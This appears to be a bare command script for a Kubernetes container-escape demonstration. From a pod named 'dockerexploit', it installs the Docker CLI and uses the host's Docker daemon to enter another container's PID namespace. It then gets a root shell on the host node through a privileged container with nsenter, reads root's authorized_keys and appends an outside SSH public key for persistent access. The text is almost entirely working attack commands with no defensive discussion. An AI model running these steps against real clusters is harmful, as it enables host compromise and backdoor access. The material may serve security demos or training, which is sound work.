kubectl apply -f deployment.yaml
kubectl get pods
kubectl exec -it dockerexploit-... bash
ps -ef

# Install Docker

apt-get update
apt-get install \
    apt-transport-https \
    ca-certificates \
    curl \
    gnupg-agent \
    software-properties-common

curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -
apt-key fingerprint 0EBFCD88
add-apt-repository \
   "deb [arch=amd64] https://download.docker.com/linux/ubuntu \
   $(lsb_release -cs) \
   stable"
apt-get update

# Prepped...

apt-get install docker-ce-cli


# docker installed

docker version
docker run hello-world
clear

# We could exec into these other contianers.
# They don't have bash...

docker run --rm -it --pid container:8a6f92cd9ecc alpine
ls cat /proc/
ls cat /proc/1/
ls cat /proc/1/root/
ls cat /proc/1/root/dev/
exit

# Can we get onto the machine

whoami
uname -a
cat /etc/os-release

docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
whoami
uname -a
cat /etc/os-release

cd /root/.ssh
ls -al
cat authorized_keys

NEW WINDOW

cat ~/.ssh/id_rsa.pub


echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkPkMmfZ1nn/LUx4Wjc8CKrxOA4tsfbFQ13pbTjW5pkuSk3catWvFIHRg+2uwOM8Rf/kB4M4pV+vLiu5MsDqGJ0jVN8anCO/8zH1V/1KFp7DNoLM7Kp3VSW+kaEQCPvD6v90WPPfQXnpSs76uuUSYaL71RIHmPmd3kc4tjrSkvsskDtU3rtIC95imHS8k29GkJLyUpirdSEDIoEFebP5DMPNK3HYvMLGoz2mDABu/yrGx8OZe225QlUxExCse/PG5tQ8oMOfpp44r6ikbZ6qvg7cb9B8kQ5weecuqPjI59+J/FkB8ipG0/vVp7lUvam8JM2Z470Sw4Jn1Ck3zHYSQB denhamparry@Lewiss-MBP.localdomain >> authorized_keys
cat authorized_keys
